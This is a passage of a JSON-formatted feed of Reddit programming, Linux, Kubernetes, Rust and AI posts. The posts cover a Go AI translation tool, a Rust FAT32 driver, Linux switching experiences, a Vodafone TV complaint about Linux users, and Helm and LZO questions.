src=\"https://external-preview.redd.it/bKve9NpRpB7UI-IBkWANvc0B3UIiENHFSkTwB0QpvS8.png?width=640&amp;crop=smart&amp;auto=webp&amp;s=7f045fb5d96d362bafaffaa88052c0d4399190ba\" alt=\"Automatic translation of applications using AI\" title=\"Automatic translation of applications using AI\" /> </a> </td><td> <!-- SC_OFF --><div class=\"md\"><p>If you use <a href=\"https://github.com/nicksnyder/go-i18n\">https://github.com/nicksnyder/go-i18n</a> in your application, I have created a tool to create new translations using AI.</p> <p>Check it out and let me know what you think.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/StephenAfamO\"> /u/StephenAfamO </a> <br/> <span><a href=\"https://github.com/go-swiss/autotranslate\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1ms9317/automatic_translation_of_applications_using_ai/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Beyond Booleans","url":"https://www.reddit.com/r/programming/comments/1ms7jwx/beyond_booleans/","date":1755377910,"author":"/u/gaearon","guid":230569,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/gaearon\"> /u/gaearon </a> <br/> <span><a href=\"https://overreacted.io/beyond-booleans/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1ms7jwx/beyond_booleans/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Apple’s new Processor Trace instrument is incredible","url":"https://www.reddit.com/r/programming/comments/1ms6pjn/apples_new_processor_trace_instrument_is/","date":1755376011,"author":"/u/victor_wynne","guid":230425,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/victor_wynne\"> /u/victor_wynne </a> <br/> <span><a href=\"https://victorwynne.com/processor-trace-instrument/?utm_source=reddit\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1ms6pjn/apples_new_processor_trace_instrument_is/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Linux Format gone...","url":"https://www.reddit.com/r/linux/comments/1ms64yx/linux_format_gone/","date":1755374744,"author":"/u/Lost4name","guid":230496,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I&#39;ve been using Linux for about twenty years and bought a few linux magazines during that time. Linux Format was my favorite and while I didn&#39;t subscribe I bought a few each year if they had articles I wanted or contents on the included disc. So it was a bad feeling when my local magazine place didn&#39;t have a copy lately. So I looked at the LF website to see that they are folding their tent. I just want to say my thanks to some good people I don&#39;t know and I will certainly miss the magazine.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Lost4name\"> /u/Lost4name </a> <br/> <span><a href=\"https://www.reddit.com/r/linux/comments/1ms64yx/linux_format_gone/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1ms64yx/linux_format_gone/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Why People Read Assembly","url":"https://www.reddit.com/r/programming/comments/1ms4o8v/why_people_read_assembly/","date":1755371493,"author":"/u/levodelellis","guid":230397,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/levodelellis\"> /u/levodelellis </a> <br/> <span><a href=\"https://codestyleandtaste.com/why-read-assembly.html\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1ms4o8v/why_people_read_assembly/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"JayzTwoCents' Linux benchmarks feel OFF... - Gardiner Bryant","url":"https://www.reddit.com/r/linux/comments/1ms48cg/jayztwocents_linux_benchmarks_feel_off_gardiner/","date":1755370554,"author":"/u/Pure_Toe6636","guid":230490,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Pure_Toe6636\"> /u/Pure_Toe6636 </a> <br/> <span><a href=\"https://peertube.wtf/w/rsg7LREccDhsRFaPdfsXab\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1ms48cg/jayztwocents_linux_benchmarks_feel_off_gardiner/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Claude now has the power to ghost us… finally equality.","url":"https://www.reddit.com/r/artificial/comments/1ms46ne/claude_now_has_the_power_to_ghost_us_finally/","date":1755370456,"author":"/u/Nomadic_Seth","guid":230497,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Windows 12 could be Linux's biggest chance, Mint 22.2 beta: Linux Weekly News - The Linux Experiment","url":"https://www.reddit.com/r/linux/comments/1ms45yw/windows_12_could_be_linuxs_biggest_chance_mint/","date":1755370414,"author":"/u/Pure_Toe6636","guid":230426,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Pure_Toe6636\"> /u/Pure_Toe6636 </a> <br/> <span><a href=\"https://peertube.wtf/w/swvrwjMRigEKqZgfeLNtMj\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1ms45yw/windows_12_could_be_linuxs_biggest_chance_mint/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"A Better Vocabulary for Testing","url":"https://www.reddit.com/r/programming/comments/1ms3x0b/a_better_vocabulary_for_testing/","date":1755369873,"author":"/u/alpaylan","guid":230606,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/alpaylan\"> /u/alpaylan </a> <br/> <span><a href=\"https://alperenkeles.com/posts/vocab-for-testing/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1ms3x0b/a_better_vocabulary_for_testing/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Recommend K8s Path","url":"https://www.reddit.com/r/kubernetes/comments/1ms3edz/recommend_k8s_path/","date":1755368746,"author":"/u/domestic_protobuf","guid":230396,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/kubernetes/comments/1ms3edz/recommend_k8s_path/\"> <img src=\"https://external-preview.redd.it/HAPFDFRRMoP2a9fJFsIVmEt8sTvE02WcjtCO87LuE3s.png?width=216&amp;crop=smart&amp;auto=webp&amp;s=4e1a03e86481a2d836f6dbfe7541e05866424954\" alt=\"Recommend K8s Path\" title=\"Recommend K8s Path\" /> </a> </td><td> <!-- SC_OFF --><div class=\"md\"><p>I’m looking at strengthening my skill set and being able to work on more high scale projects. What is the best recommendation to go from knowing nothing about docker and K8s to being able to deploy something likehttps://open-metadata.org in a production environment? Ideally, I would like to start by knowing just enough to deploy something on EKS with a helm chart and naturally keep growing my knowledge. </p> <p>Any recommendations for courses or instructors? I know AWS has the EKS workshop that is really good, but I don’t want to jump into EKS without foundational knowledge. I’m totally okay paying for a course or instructor since I want to take this really seriously.</p> <p>I know I can just try to deploy this myself and struggle through it, but I do and learn a lot better by having a guided path.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/domestic_protobuf\"> /u/domestic_protobuf </a> <br/> <span><a href=\"https://open-metadata.org\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1ms3edz/recommend_k8s_path/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Again and Again","url":"https://www.reddit.com/r/kubernetes/comments/1ms2joc/again_and_again/","date":1755366928,"author":"/u/Ancient-Mongoose-346","guid":230365,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/kubernetes/comments/1ms2joc/again_and_again/\"> <img src=\"https://preview.redd.it/p0ma78a37fjf1.jpeg?width=640&amp;crop=smart&amp;auto=webp&amp;s=ceccb6167a5b52a458a8237f76fe4a7d9240cb4c\" alt=\"Again and Again\" title=\"Again and Again\" /> </a> </td><td> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Ancient-Mongoose-346\"> /u/Ancient-Mongoose-346 </a> <br/> <span><a href=\"https://i.redd.it/p0ma78a37fjf1.jpeg\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1ms2joc/again_and_again/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"What standard library packages a Go developer should be familiar like back of their hand?","url":"https://www.reddit.com/r/golang/comments/1ms1xtr/what_standard_library_packages_a_go_developer/","date":1755365626,"author":"/u/nerdy_adventurer","guid":230400,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p><a href=\"https://www.reddit.com/r/Python/comments/1mk5sk8/what_packages_should_intermediate_devs_know_like/\">Same question</a> but for Golang. What I think worth knowing is testing, io, http, sql packages, but since API surface for these packages are large, which interfaces and methods one should be familiar with from those packages?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/nerdy_adventurer\"> /u/nerdy_adventurer </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1ms1xtr/what_standard_library_packages_a_go_developer/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1ms1xtr/what_standard_library_packages_a_go_developer/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I just published a minimal FAT32 file system driver written in #[no_std] rust. Designed specifically around the limitations of working with an SDCard in an embedded environment.","url":"https://www.reddit.com/r/rust/comments/1mrz2lu/i_just_published_a_minimal_fat32_file_system/","date":1755359449,"author":"/u/careyi4","guid":230351,"unread":true,"content":"<p>The odyssey starts with me working on a new embedded systems project and wanting to log some data to an SDCard to then analyse it on my computer. I have been working on a years long project to develope my own suite of tools etc. for building robotics projects using a custom designed STM32 dev board running Rust. So far, the STM32 HAL (<a href=\"https://github.com/stm32-rs/stm32f4xx-hal\">https://github.com/stm32-rs/stm32f4xx-hal</a>) library has been excellent for this. I was happy when I found out this library supports hardware level SDIO for SDCard comms. However, the issue is, this is only very low level and provides only the ability to read and write blocks of 512 bytes at a time from specific block addresses.</p><p>I decided this was the time to take on a side project of writing my own FAT32 driver which specifically operates within the constraints of the HAL library above. I started out by implementing all of the logic in a Python prototype running on my local machine. From this, I then ported all the logic over to no_std rust and again got that all working on my local machine. The key to this was to ensure that while I was using my machines underlying low level file IO, I kept it abstracted out to specifically read and write in blocks of 512 bytes at a time. The vision being that when I ran the rust code on my embedded platform, I just needed to swap out the IO functions for the ones provided by the HAL lib.</p><p>Long story short, it all just worked first time!! I published my crate, imported it into my embedded project, compiled it and it just ran perfectly. I was honestly shocked by this, I was pretty sure it was going to work, but I was nervous, I had spent weeks working on this in the small amount of free time I have, so I was relieved when it just worked!</p><p>Anyway, I just wanted to share what I built with you all, hope someone finds the project interesting.</p><p>I will be making another video soon running through the latest.</p>","contentLength":1890,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Need to make sure pre job succeeds before the sts pod gets upgraded","url":"https://www.reddit.com/r/kubernetes/comments/1mrxt46/need_to_make_sure_pre_job_succeeds_before_the_sts/","date":1755356671,"author":"/u/iam_adorable_robot","guid":230338,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I have a helm chart which has a pre job , the sts yaml and a post job. The problem I am facing is that during upgrades, the pre job and sts pod rollout happens simultaneously since helm only triggers the pre job but does not wait for it to complete. Is there a helm native way to achieve this?</p> <p>Few constraints: - since this setup is needed for upgrade of existing sts, I cannot add this pre job logic as init container since that would essentially recreate the pod anyway. I want to achieve this such that the pre job takes backup of data from existing pod (running older version) then the pod gets upgraded. - cannot use helm --wait since this chart is a part of bigger installer setup</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/iam_adorable_robot\"> /u/iam_adorable_robot </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1mrxt46/need_to_make_sure_pre_job_succeeds_before_the_sts/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1mrxt46/need_to_make_sure_pre_job_succeeds_before_the_sts/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I'm using Linux Mint now daily for the last 4 months and I start to love the flexibility & simpleness of Linux. Windows on the other hand feels now clunky and bloated.","url":"https://www.reddit.com/r/linux/comments/1mrxkfd/im_using_linux_mint_now_daily_for_the_last_4/","date":1755356157,"author":"/u/jf_administration","guid":230340,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>What do you like at Linux more compared to WIndows and MacOS?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/jf_administration\"> /u/jf_administration </a> <br/> <span><a href=\"https://i.redd.it/bh38mr6a9ejf1.png\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1mrxkfd/im_using_linux_mint_now_daily_for_the_last_4/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The Peculiar Case of Japanese Web Design","url":"https://www.reddit.com/r/programming/comments/1mrxjog/the_peculiar_case_of_japanese_web_design/","date":1755356111,"author":"/u/Witty-Play9499","guid":230339,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Witty-Play9499\"> /u/Witty-Play9499 </a> <br/> <span><a href=\"https://sabrinas.space/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mrxjog/the_peculiar_case_of_japanese_web_design/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"What were your biggest struggles when switching to Linux for the first time?","url":"https://www.reddit.com/r/linux/comments/1mrxbf6/what_were_your_biggest_struggles_when_switching/","date":1755355601,"author":"/u/EskaiGarcia","guid":230513,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I&#39;ve been helping a couple of people, mostly friends, switch to Linux recently after the current state of privacy on Windows and I&#39;m surprised at the different parts of the experience different people struggle with, what are the points of the change that you needed help with or would have liked better tutorials for?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/EskaiGarcia\"> /u/EskaiGarcia </a> <br/> <span><a href=\"https://www.reddit.com/r/linux/comments/1mrxbf6/what_were_your_biggest_struggles_when_switching/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1mrxbf6/what_were_your_biggest_struggles_when_switching/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"typed-arrow - Provides compile‑time Arrow schemas for Rust.","url":"https://github.com/tonbo-io/typed-arrow","date":1755354541,"author":"/u/yacl","guid":230438,"unread":true,"content":"<p>When working with arrow-rs, we noticed that schemas are declared at runtime. This often leads to runtime errors and makes development less safe.</p><p>typed-arrow takes a different approach:</p><ul><li>Schemas are declared at compile time with Rust’s type system.</li><li>This eliminates runtime schema errors.</li><li>And introduces no runtime overhead — everything is checked and generated by the compiler.</li></ul><p>If you’ve run into Arrow runtime schema issues, and your schema is stable (not defined or switched at runtime), this project might be useful.</p>","contentLength":518,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mrwu5f/typedarrow_provides_compiletime_arrow_schemas_for/"},{"title":"[D] model architecture or data?","url":"https://www.reddit.com/r/MachineLearning/comments/1mrwm3w/d_model_architecture_or_data/","date":1755354049,"author":"/u/the_iegit","guid":230326,"unread":true,"content":"<p>I’ve just read that the new model architecture called Hierarchical Reasoning Model (HRM) gains it’s performance benefits from data augmentation techniques and chain of thought rather than model architecture itself. link: <a href=\"https://arcprize.org/blog/hrm-analysis\">https://arcprize.org/blog/hrm-analysis</a></p><p>And i’ve heard same opinion about transformers that the success of current llms is about cramming enormous amounts of data into it rather than the genius of the architecture</p><p>Can someone explain which of the sides is closer to the truth?</p>","contentLength":500,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"2020 vs 2025","url":"https://www.reddit.com/r/artificial/comments/1mrvwaz/2020_vs_2025/","date":1755352384,"author":"/u/katxwoods","guid":230367,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Vodafone TV blocks Linux users – let’s make our voices heard","url":"https://www.reddit.com/r/linux/comments/1mrvik9/vodafone_tv_blocks_linux_users_lets_make_our/","date":1755351477,"author":"/u/BulkyMix6581","guid":230327,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I recently discovered that Vodafone TV is completely inaccessible from Linux desktops. On the very same PC, it works fine under Windows, but on Linux the service blocks playback altogether. Even with tricks like user-agent spoofing or running a Windows VM, it still refuses to play anything. The only way I could get it working was by booting into my Windows partition, which makes it clear that Vodafone is deliberately blocking Linux browsers.</p> <p>This is extremely frustrating, because Vodafone advertises the service as accessible “from any device via browser” without ever disclosing that Linux is excluded. At the same time, the company’s own hardware and infrastructure are heavily based on Linux, from routers to Android TV boxes, making this restriction feel hypocritical and arbitrary.</p> <p>It is also unfair and discriminatory. In many regions Linux has a larger desktop market share than macOS, yet macOS is supported while Linux users are left out. There is no real technical excuse for this either. Competing streaming platforms such as Netflix, Disney+, Amazon Prime, HBO, and even local services like COSMOTE TV have supported Linux browsers for years using standard DRM technologies like Widevine. Vodafone simply hasn’t bothered to implement the same solution.</p> <p>Beyond the technical issues, this raises important questions of consumer rights, accessibility, and transparency. Paying customers are denied equal access to a service they have subscribed to, with no prior disclosure. That is unacceptable in 2025, especially from a company of Vodafone’s size and resources.</p> <p>I have already submitted a formal complaint to Vodafone Greece. But this won’t change unless Linux users everywhere make their voices heard. If you are a Vodafone customer in any country, please take a few minutes to send a complaint to your local Vodafone branch.</p> <p>Even a short message demanding equal support for Linux is valuable. If we push together, Vodafone will have no choice but to realize that ignoring Linux users is not an option.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/BulkyMix6581\"> /u/BulkyMix6581 </a> <br/> <span><a href=\"https://www.reddit.com/r/linux/comments/1mrvik9/vodafone_tv_blocks_linux_users_lets_make_our/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1mrvik9/vodafone_tv_blocks_linux_users_lets_make_our/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Workload Identity Federation Explained with a School Trip Analogy (2-min video)","url":"https://www.reddit.com/r/kubernetes/comments/1mrvgyx/workload_identity_federation_explained_with_a/","date":1755351372,"author":"/u/mmk4mmk_simplifies","guid":230323,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/kubernetes/comments/1mrvgyx/workload_identity_federation_explained_with_a/\"> <img src=\"https://preview.redd.it/lfanlu9uwdjf1.png?width=640&amp;crop=smart&amp;auto=webp&amp;s=cc30964929b2ec7b889031c309dd9469db9a7df2\" alt=\"Workload Identity Federation Explained with a School Trip Analogy (2-min video)\" title=\"Workload Identity Federation Explained with a School Trip Analogy (2-min video)\" /> </a> </td><td> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/mmk4mmk_simplifies\"> /u/mmk4mmk_simplifies </a> <br/> <span><a href=\"https://i.redd.it/lfanlu9uwdjf1.png\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1mrvgyx/workload_identity_federation_explained_with_a/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"LZO compression in GO","url":"https://www.reddit.com/r/golang/comments/1mrv9ie/lzo_compression_in_go/","date":1755350867,"author":"/u/AbhilashAbhi1289","guid":230427,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hey folks, i am working in a project where i have to decompress the data from stock exchange. I did not find any package in Go which does it. I have looked on the internet for the solution, all I found was to load the lzo.dll and use &quot;C&quot; package in Go.</p> <p>Do anyone have a better approach for this? Also did anyone work with FIX/FAST protocol in Go, I would love to know your experience and inputs on working with it.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/AbhilashAbhi1289\"> /u/AbhilashAbhi1289 </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1mrv9ie/lzo_compression_in_go/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1mrv9ie/lzo_compression_in_go/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Sebastian Lague: Ray-Traced Glass and Caustics","url":"https://www.reddit.com/r/programming/comments/1mrtg4o/sebastian_lague_raytraced_glass_and_caustics/","date":1755346208,"author":"/u/Pink401k","guid":230325,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Pink401k\"> /u/Pink401k </a> <br/> <span><a href=\"https://youtu.be/wA1KVZ1eOuA?si=x1aL5rnCXGu6zASh\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mrtg4o/sebastian_lague_raytraced_glass_and_caustics/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"A flirty Meta AI bot invited a retiree to meet. He never made it home.","url":"https://www.reuters.com/investigates/special-report/meta-ai-chatbot-death/","date":1755343408,"author":"/u/F0urLeafCl0ver","guid":230473,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mrsgs7/a_flirty_meta_ai_bot_invited_a_retiree_to_meet_he/"}],"tags":["reddit"]}